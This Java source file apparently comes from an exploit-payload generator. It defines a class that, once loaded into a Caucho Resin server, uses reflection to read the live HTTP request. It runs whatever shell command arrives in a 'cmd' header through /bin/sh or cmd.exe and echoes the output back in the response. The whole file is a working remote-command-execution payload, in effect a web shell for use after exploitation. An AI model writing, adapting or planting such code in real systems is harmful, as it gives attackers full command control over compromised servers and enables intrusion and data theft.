package jeg.core.template.resin;

import java.io.InputStream;
import java.io.Writer;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.util.Scanner;

public class ResinCmdExecTpl {
    private String getReqHeaderName() {
        return "cmd";
    }

    public ResinCmdExecTpl(){
        run();
    }

    private void run() {
        try {
            Object currentRequest = Thread.currentThread().getContextClassLoader().loadClass("com.caucho.server.dispatch.ServletInvocation").getMethod("getContextRequest").invoke(null);
            Field _responseF;
            if(currentRequest.getClass().getName().contains("com.caucho.server.http.HttpRequest")){
                // 3.x 需要从父类中获取
                _responseF = currentRequest.getClass().getSuperclass().getDeclaredField("_response");
            }else{
                _responseF = currentRequest.getClass().getDeclaredField("_response");
            }
            _responseF.setAccessible(true);
            Object response = _responseF.get(currentRequest);
            Method getWriterM = response.getClass().getMethod("getWriter");
            Writer writer = (Writer)getWriterM.invoke(response);
            Method getHeaderM = currentRequest.getClass().getMethod("getHeader", String.class);
            String cmd = (String)getHeaderM.invoke(currentRequest, getReqHeaderName());
            writer.write(exec(cmd));
        }catch (Exception e){

        }
    }

    private String exec(String cmd){
        try {
            boolean isLinux = true;
            String osType = System.getProperty("os.name");
            if (osType != null && osType.toLowerCase().contains("win")) {
                isLinux = false;
            }

            String[] cmds = isLinux ? new String[]{"/bin/sh", "-c", cmd} : new String[]{"cmd.exe", "/c", cmd};
            InputStream in = Runtime.getRuntime().exec(cmds).getInputStream();
            Scanner s = new Scanner(in).useDelimiter("\\a");
            String execRes = "";
            while (s.hasNext()) {
                execRes += s.next();
            }
            return execRes;
        }catch (Exception e){
            return e.getMessage();
        }
    }
}
